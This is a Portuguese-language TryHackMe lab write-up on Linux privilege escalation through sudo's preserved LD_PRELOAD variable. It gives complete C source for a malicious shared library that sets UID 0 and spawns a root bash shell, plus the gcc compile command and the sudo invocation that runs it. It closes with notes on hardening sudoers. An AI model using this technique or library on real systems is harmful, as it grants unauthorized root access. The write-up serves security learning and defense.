#### Task 7 – LD_PRELOAD / Environment Variables

##### Objetivo da Task

 - Explorar variáveis de ambiente do sudo, especificamente `LD_PRELOAD`, para carregar bibliotecas maliciosas e obter shell root

##### Na máquina do DEBIAN do TryHackMe:
```bash
 
user@debian:~$ sudo -l

#Saída:

User user may run the following commands on debian:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/nano
    (root) SETENV: /usr/bin/apache2
```
##### O que significa basicamente: 

 - NOPASSWD = não precisa de senha para executar
 - SETENV = permite manter variáveis de ambiente (como LD_PRELOAD)
 - após usar o comando `-l | grep LD_PRELOAD` confirma que o `env_keep+=LD_PRELOAD` está ativo
```
#Saída 

`env_keep+=LD_PRELOAD` 

 - $ ou seja, a variável LD_PRELOAD é preservada quando você usa sudo.
```
##### Agora criamos um Codigo C malicioso:

```bash 
cd /home/user/tools/sudo   $ O lab vem com um script em c pro shell root
nano preload.c
```
 - Conteúdo do scrip preload.c:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
} 
 
##### Compilar a biblioteca compartilhada

`gcc -fPIC -shared -o preload.so preload.c -nostartfiles`
 
##### Agora so executar com o sudo usando o LD_PRELOAD

```sudo LD_PRELOAD=/home/user/tools/sudo/preload.so apache2

#Saída:

sh-4.1#	

whoami
Root
```
- Shell root Feito

##### O que aprendi

 - LD_PRELOAD é uma variável que carrega bibliotecas compartilhadas ANTES de qualquer outra
 - SETENV no sudo permite que variáveis de ambiente sejam mantidas
 - gcc -fPIC -shared serve para compilar uma biblioteca compartilhada .so
 - -nostartfiles é necessário para que _init() funcione corretamente
 - Qualquer programa com SETENV pode ser usado, não apenas apache2

##### Prevenção

 - Não usar SETENV com programas que usuários comuns podem executar
 - Remover LD_PRELOAD e LD_LIBRARY_PATH do env_keep
 - Usar env_reset nas configurações do sudoers
 - Monitorar quem tem permissão para usar sudo
